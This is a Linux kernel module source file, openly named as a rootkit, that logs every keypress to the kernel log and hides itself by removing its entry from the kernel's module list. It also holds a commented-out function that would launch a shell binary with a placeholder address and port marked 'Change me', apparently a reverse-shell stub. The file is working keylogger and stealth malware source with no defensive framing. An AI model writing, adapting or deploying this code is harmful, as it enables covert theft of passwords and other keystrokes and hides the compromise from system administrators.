#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/keyboard.h>

/* PROTO */

int keyboard_hook(struct notifier_block *, unsigned long code, void *);

/* DATA */

static struct notifier_block nb = {
  .notifier_call = keyboard_hook
};

/* FUNCTIONALITY */

int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  //struct vc_data *vc = param->vc;
   
  if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
 
  return NOTIFY_OK;
}

void hide_module(void){
	//struct list_head * head=&(__this_module.list);
	//if (!list_empty(head))
	//	list_del(head->next);

	list_del(&(__this_module.list));

}

void unhide_module(void){
}

/*
static void start_shell(void){
  static char *path = "/data/local/shell";
  char *argv[] = { "/data/local/shell", "127.0.0.1", "80", NULL }; //Change me
  static char *envp[] =   { "HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
  call_usermodehelper (path, argv, envp, 1);
}*/

/*BOOTSTRAPING*/

static int __init rootkit_start(void){
	hide_module();
	register_keyboard_notifier(&nb);
	return 0;
}

static void __exit rootkit_end(void){
	unregister_keyboard_notifier(&nb);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
